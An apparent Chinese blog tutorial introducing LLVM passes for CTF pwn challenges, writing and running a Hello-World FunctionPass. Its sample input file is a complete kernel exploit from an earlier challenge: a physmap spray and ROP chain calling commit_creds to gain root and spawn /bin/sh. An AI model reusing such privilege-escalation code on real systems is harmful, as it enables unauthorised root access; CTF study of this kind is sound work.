近年来，pwn题出的可谓是越来越花，从C++到kernel，再到Rust、Go、Java一众语言，还有LLVM。其中LLVM在各种比赛中的出现频率越来越高，值得引起重视。借这篇文章，笔者开始LLVM pass类pwn题的入门。

首先，既然要研究LLVM，就要清楚LLVM到底是什么。

> 它是以C++编写的构架编译器的框架系统。用于优化以任意程序语言编写的程序的编译时间(compile-time)、链接时间(link-time)、运行时间(run-time)以及空闲时间(idle-time)，对开发者保持开放，并兼容已有脚本。（摘自[资料](https://blog.csdn.net/yayaayaya123/article/details/83993041?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165728197316781818799638%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165728197316781818799638&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-83993041-null-null.142^v32^control,185^v2^control&utm_term=LLVM&spm=1018.2226.3001.4187)）

LLVM在编译过程中实际上发挥了一个牵线搭桥的作用。高级语言多种多样，但无论是哪一种语言的编译器，都需要对高级语言编写的代码进行词法与句法分析，这是编译器前端部分的工作。在分析完成后，前端会输出一个抽象语法树AST，由LLVM进行分析与优化，转化为中间表示IR。再由编译器后端根据IR生成可供执行的二进制代码。

> 而pass是一种编译器开发的结构化技术，用于完成编译对象（如IR）的转换、分析或优化等功能。pass的执行就是编译器对编译对象进行转换、分析和优化的过程，pass构建了这些过程所需要的分析结果。
> 大概就是说，LLVM提供了一种中间语言形式，以及编译链接这种语言的后端能力，那么对于一个新语言，只要开发者能够实现新语言到IR的编译器前端设计，就可以享受到从IR到可执行文件这之间的LLVM提供的所有优化、分析或者代码插桩的能力。（摘自[资料](https://mp.weixin.qq.com/s/6yHWECP21Fn-P585wxRTJA)）

下面，笔者使用Ubuntu 20.04系统进行第一个LLVM pass的编写测试。

首先安装Clang：``apt install clang``，在Ubuntu 20.04安装clang会附带安装llvm-9和llvm-10，经过测试发现，只有llvm-10能够正常使用，用llvm-9的库编译会报错。

这里借[资料](https://mp.weixin.qq.com/s/6yHWECP21Fn-P585wxRTJA)中的测试代码编写：

myFirstLLVMpass.cpp:
```cpp
#include "llvm/Pass.h"//写Pass所必须的库
#include "llvm/IR/Function.h"//操作函数所必须的库
#include "llvm/Support/raw_ostream.h"//打印输出所必须的库
#include "llvm/IR/LegacyPassManager.h"
#include "llvm/Transforms/IPO/PassManagerBuilder.h"
 
using namespace llvm;
 
namespace { //声明匿名空间，被声明的内容仅在文件内部可见
  struct Hello : public FunctionPass {
    static char ID;
    Hello() : FunctionPass(ID) {}
    bool runOnFunction(Function &F) override {//重写runOnFunction，使得每次遍历到一个函数的时候就输出函数名
      errs() << "Hello: ";
      errs().write_escaped(F.getName()) << '\n';
      return false;
    }
  };
}
 
char Hello::ID = 0;
 
// Register for opt
static RegisterPass<Hello> X("hello", "Hello World Pass");//注册类Hello，第一个参数是命令行参数，第二个参数是名字
 
// Register for clang
static RegisterStandardPasses Y(PassManagerBuilder::EP_EarlyAsPossible,
  [](const PassManagerBuilder &Builder, legacy::PassManagerBase &PM) {
    PM.add(new Hello());
  });
```

上面就是LLVM pass的C++代码了。我们需要一个C语言文件，这个文件中的内容无关紧要，这里用笔者做kernel pwn题中的一个文件为例：

firstLLVMtest.c:
```c
//
// Created by root on 22-7-7.
//
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <sys/mman.h>

const size_t commit_creds = 0xFFFFFFFF810C92E0;
const size_t init_cred = 0xFFFFFFFF82A6B700;
const size_t swapgs_restore_regs_and_return_to_usermode = 0xFFFFFFFF81C00FB0 + 0x1B;
const size_t ret = 0xFFFFFFFF810001FC;
const size_t poprdi_ret = 0xffffffff8108c6f0;
const size_t poprsp_ret = 0xffffffff811483d0;
const size_t add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = 0xffffffff810737fe;
long page_size;
size_t* map_spray[16000];
size_t guess;
int dev;

size_t user_cs, user_ss, user_rflags, user_sp;

void save_status();
void print_binary(char*, int);
void info_log(char*);
void error_log(char*);
void getShell();
void makeROP(size_t*);

void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    info_log("Status has been saved.");
}

// this is a universal function to print binary data from a char* array
void print_binary(char* buf, int length){
    int index = 0;
    char output_buffer[80];
    memset(output_buffer, '\0', 80);
    memset(output_buffer, ' ', 0x10);
    for(int i=0; i<(length % 16 == 0 ? length / 16 : length / 16 + 1); i++){
        char temp_buffer[0x10];
        memset(temp_buffer, '\0', 0x10);
        sprintf(temp_buffer, "%#5x", index);
        strcpy(output_buffer, temp_buffer);
        output_buffer[5] = ' ';
        output_buffer[6] = '|';
        output_buffer[7] = ' ';
        for(int j=0; j<16; j++){
            if(index+j >= length)
                sprintf(output_buffer+8+3*j, "   ");
            else{
                sprintf(output_buffer+8+3*j, "%02x ", ((int)buf[index+j]) & 0xFF);
                if(!isprint(buf[index+j]))
                    output_buffer[58+j] = '.';
                else
                    output_buffer[58+j] = buf[index+j];
            }
        }
        output_buffer[55] = ' ';
        output_buffer[56] = '|';
        output_buffer[57] = ' ';
        printf("%s\n", output_buffer);
        memset(output_buffer+58, '\0', 16);
        index += 16;
    }
}

void error_log(char* error_info){
    printf("\033[31m\033[1m[x] Fatal Error: %s\033[0m\n", error_info);
    exit(1);
}

void info_log(char* info){
    printf("\033[33m\033[1m[*] Info: %s\033[0m\n", info);
}

void success_log(char* info){
    printf("\033[32m\033[1m[+] Success: %s\033[0m\n", info);
}

void getShell(){
    info_log("Ready to get root......");
    if(getuid()){
        error_log("Failed to get root!");
    }
    success_log("Root got!");
    system("/bin/sh");
}

void makeROP(size_t* space){
    int index = 0;
    for(; index < (page_size / 8 - 0x30); index++)
        space[index] = add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret;
    for(; index < (page_size / 8 - 0x10); index++)
        space[index] = ret;
    space[index++] = poprdi_ret;
    space[index++] = init_cred;
    space[index++] = commit_creds;
    space[index++] = swapgs_restore_regs_and_return_to_usermode;
    space[index++] = 0xdeadbeefdeadbeef;
    space[index++] = 0xdeadbeefdeadbeef;
    space[index++] = (size_t)getShell;
    space[index++] = user_cs;
    space[index++] = user_rflags;
    space[index++] = user_sp;
    space[index] = user_ss;

    info_log("Spray content below:");
    print_binary((char*)space, page_size);
}

int main(){
    save_status();

    dev = open("/dev/kgadget", O_RDWR);
    if(dev < 0)     // failed to open key device, an unexpected error
        error_log("Cannot open device \"/dev/kgadget\"!");

    page_size = sysconf(_SC_PAGESIZE);      // the size of a page, namely 4096 bytes

    info_log("Spraying physmap......");

    map_spray[0] = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    makeROP(map_spray[0]);

    for(int i=1; i<15000; i++){
        map_spray[i] = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if(!map_spray[i])
            error_log("Mmap Failure!");
        memcpy(map_spray[i], map_spray[0], page_size);
    }

    guess = 0xffff888000000000 + 0x7000000;

    info_log("Ready to turn to kernel......");

    __asm__("mov r15, 0xdeadbeef;"
            "mov r14, 0xcafebabe;"
            "mov r13, 0xdeadbeef;"
            "mov r12, 0xcafebabe;"
            "mov r11, 0xdeadbeef;"
            "mov r10, 0xcafebabe;"
            "mov rbp, 0x12345678;"
            "mov rbx, 0x87654321;"
            "mov r9, poprsp_ret;"
            "mov r8, guess;"
            "mov rax, 0x10;"
            "mov rcx, 0x12345678;"
            "mov rdx, guess;"
            "mov rsi, 0x1bf52;"
            "mov rdi, dev;"
            "syscall;"
            );
    return 0;
}
```

用下面的命令可以生成.ll文件准备输入到LLVM中：``clang -emit-llvm -S firstLLVMtest.c -o firstLLVMtest.ll``

生成的.ll文件的前面一部分内容：
```
; ModuleID = 'firstLLVMtest.c'
source_filename = "firstLLVMtest.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

@commit_creds = dso_local constant i64 -2129882400, align 8
@init_cred = dso_local constant i64 -2103003392, align 8
@swapgs_restore_regs_and_return_to_usermode = dso_local constant i64 -2118119477, align 8
@ret = dso_local constant i64 -2130705924, align 8
@poprdi_ret = dso_local constant i64 -2130131216, align 8
@poprsp_ret = dso_local constant i64 -2129361968, align 8
@add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = dso_local constant i64 -2130233346, align 8
@.str = private unnamed_addr constant [23 x i8] c"Status has been saved.\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"%#5x\00", align 1
@.str.2 = private unnamed_addr constant [4 x i8] c"   \00", align 1
@.str.3 = private unnamed_addr constant [6 x i8] c"%02x \00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.5 = private unnamed_addr constant [34 x i8] c"\1B[31m\1B[1m[x] Fatal Error: %s\1B[0m\0A\00", align 1
@.str.6 = private unnamed_addr constant [27 x i8] c"\1B[33m\1B[1m[*] Info: %s\1B[0m\0A\00", align 1
@.str.7 = private unnamed_addr constant [30 x i8] c"\1B[32m\1B[1m[+] Success: %s\1B[0m\0A\00", align 1
@.str.8 = private unnamed_addr constant [24 x i8] c"Ready to get root......\00", align 1
@.str.9 = private unnamed_addr constant [20 x i8] c"Failed to get root!\00", align 1
@.str.10 = private unnamed_addr constant [10 x i8] c"Root got!\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@page_size = common dso_local global i64 0, align 8
@user_cs = common dso_local global i64 0, align 8
@user_rflags = common dso_local global i64 0, align 8
@user_sp = common dso_local global i64 0, align 8
@user_ss = common dso_local global i64 0, align 8
@.str.12 = private unnamed_addr constant [21 x i8] c"Spray content below:\00", align 1
@.str.13 = private unnamed_addr constant [13 x i8] c"/dev/kgadget\00", align 1
@dev = common dso_local global i32 0, align 4
@.str.14 = private unnamed_addr constant [35 x i8] c"Cannot open device \22/dev/kgadget\22!\00", align 1
@.str.15 = private unnamed_addr constant [23 x i8] c"Spraying physmap......\00", align 1
@map_spray = common dso_local global [16000 x i64*] zeroinitializer, align 16
@.str.16 = private unnamed_addr constant [14 x i8] c"Mmap Failure!\00", align 1
@guess = common dso_local global i64 0, align 8
@.str.17 = private unnamed_addr constant [30 x i8] c"Ready to turn to kernel......\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @save_status() #0 {
  call void asm sideeffect "mov user_cs, cs;mov user_ss, ss;mov user_sp, rsp;pushf;pop user_rflags;", "~{dirflag},~{fpsr},~{flags}"() #6, !srcloc !2
  call void @info_log(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str, i64 0, i64 0))
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @info_log(i8* %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.6, i64 0, i64 0), i8* %3)
  ret void
}
```

上面的代码是可读的，用另外一种方式阐述了代码的执行流程。

然后使用下面的命令生成.so文件，作为LLVM的动态链接库LLVMFirst.so：
``clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared myFirstLLVMpass.cpp -o LLVMFirst.so `llvm-config --ldflags``

最后用下面的命令将.ll文件输入到LLVM中，如果想要得到结果可以在后面添加``> [文件名]``来获取：
``opt -load ./LLVMFirst.so -hello ./firstLLVMtest.ll``

其执行结果为：
```
WARNING: You're attempting to print out a bitcode file.
This is inadvisable as it may cause display problems. If
you REALLY want to taste LLVM bitcode first-hand, you
can force output with the `-f' option.

Hello: save_status
Hello: info_log
Hello: print_binary
Hello: error_log
Hello: success_log
Hello: getShell
Hello: makeROP
Hello: main
```

可以看到输出了很多Hello开头的行，这是因为在上面的C++程序中，我们在匿名命名空间中重载了runOnFunction函数，让LLVM输出Hello之后再输出函数的名字，这样就有了上面的几行。

在LLVM pass中可以对函数、函数中的循环、函数中的操作指令等一系列对象进行记录、修改等各种操作，具体的操作类参见[资料](https://blog.csdn.net/mamamama811/article/details/110165333?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165736882716782246435214%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165736882716782246435214&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-110165333-null-null.142^v32^control,185^v2^control&utm_term=llvm%20pass&spm=1018.2226.3001.4187)。在下一篇文章中笔者会详细分析一道题，过一下LLVM pass类pwn题的流程。
